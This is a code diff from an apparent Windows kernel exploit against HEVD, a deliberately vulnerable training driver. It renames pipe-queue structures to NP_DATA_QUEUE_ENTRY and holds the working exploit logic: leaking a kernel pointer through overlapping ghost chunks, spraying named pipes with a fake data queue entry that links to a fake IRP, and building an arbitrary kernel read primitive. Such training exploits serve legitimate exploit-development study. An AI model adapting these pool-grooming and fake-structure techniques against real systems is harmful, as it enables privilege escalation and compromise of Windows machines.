@@ -8,7 +8,7 @@
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
 
-pipe_queue_entry_irp_t g_fake_irp;
+IRP g_fake_irp;
 
 void allocateNewVsSubSegment()
 {
@@ -143,8 +143,8 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_gr
         {
             printf("[+] Detected information leak from overlapping chunks in pipe %lld (fake_pool_header)\n", previous_chunk_idx);
 
-            addrs->root_pipe_queue_entry = (uintptr_t)leaked_ghost_chunk_data.pipe_queue_entry.list.Flink;
-            printf("[+] root_pipe_queue_entry: 0x%llX\n", addrs->root_pipe_queue_entry);
+            addrs->np_cbb_data_queue = (uintptr_t)leaked_ghost_chunk_data.np_data_queue_entry.QueueEntry.Flink;
+            printf("[+] np_cbb_data_queue: 0x%llX\n", addrs->np_cbb_data_queue);
 
             pipes->ghost_chunk_pipe = ghost_chunk_candidates->pipes[ghost_chunk_idx];
             printf("[+] ghost_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->ghost_chunk_pipe.read, pipes->ghost_chunk_pipe.write);
@@ -167,26 +167,26 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_gr
     return 0;
 }
 
-void setFakePipeQueueEntry(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+void setFakeNpDataQueueEntry(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 {
-    vs_chunk_t fake_pipe_queue_entry_chunk = { 0 };
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.linkedIRP = (uintptr_t)&g_fake_irp;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.SecurityClientContext = 0;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.isDataInKernel = 0x1;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.DataSize = 0xffffffff;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.remaining_bytes = 0xffffffff;
-    fake_pipe_queue_entry_chunk.pipe_queue_entry.field_2C = 0x43434343;
+    vs_chunk_t fake_np_data_queue_entry_chunk = { 0 };
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_cbb_data_queue;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_cbb_data_queue;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.Irp = (uintptr_t)&g_fake_irp;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.ClientSecurityContext = 0;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.DataEntryType = 0x1;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.DataSize = 0xffffffff;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.QuotaInEntry = 0xffffffff;
+    fake_np_data_queue_entry_chunk.np_data_queue_entry.unknown = 0x43434343;
 
-    uintptr_t pipe_queue_entry_addr;
+    uintptr_t ghost_np_data_queue_entry;
     do
     {
         printf(".");
         FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
-        pipes->previous_chunk_pipe = AllocNPPNxChunk(&fake_pipe_queue_entry_chunk, VULN_BLOCK_SIZE);
-        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    } while (pipe_queue_entry_addr == 0x4141414141414141);
+        pipes->previous_chunk_pipe = AllocNPPNxChunk(&fake_np_data_queue_entry_chunk, VULN_BLOCK_SIZE);
+        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->np_cbb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
+    } while (ghost_np_data_queue_entry == 0x4141414141414141);
     printf("\n");
 }
 
@@ -223,8 +223,8 @@ int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
     printf("[*] Enabling a dynamic lookaside list (0x%X)...\n", VULN_BLOCK_SIZE);
     enableLookaside(1, VULN_BLOCK_SIZE);
 
-    puts("[*] Spraying pipes with fake pipe queue entry...");
-    setFakePipeQueueEntry(pipes, addrs);
+    puts("[*] Spraying pipes with fake NP_DATA_QUEUE_ENTRY...");
+    setFakeNpDataQueueEntry(pipes, addrs);
 
     return 1;
 }
